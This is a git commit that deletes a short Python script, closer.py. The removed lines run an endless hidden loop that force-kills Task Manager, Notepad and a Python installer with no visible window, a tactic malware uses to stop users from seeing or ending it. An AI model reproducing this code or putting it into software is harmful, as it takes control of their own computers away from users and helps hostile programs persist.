2bfd0a8886964a1fd32606cb894f3c499dd2b482
semihcelik8 <81470723+semihcelik8@users.noreply.github.com>
2022-05-13 21:45:42 +0300

    Delete closer.py

--- closer.py
+++
@@ -1,9 +0,0 @@
-import subprocess
-
-while True:
-        CREATE_NO_WINDOW = 0x08000000
-        subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=CREATE_NO_WINDOW)
-        CREATE_NO_WINDOW = 0x08000000
-        subprocess.call('taskkill /F /IM notepad.exe', creationflags=CREATE_NO_WINDOW)
-        CREATE_NO_WINDOW = 0x08000000
-        subprocess.call('taskkill /F /IM python-3.10.2-amd64.exe', creationflags=CREATE_NO_WINDOW)
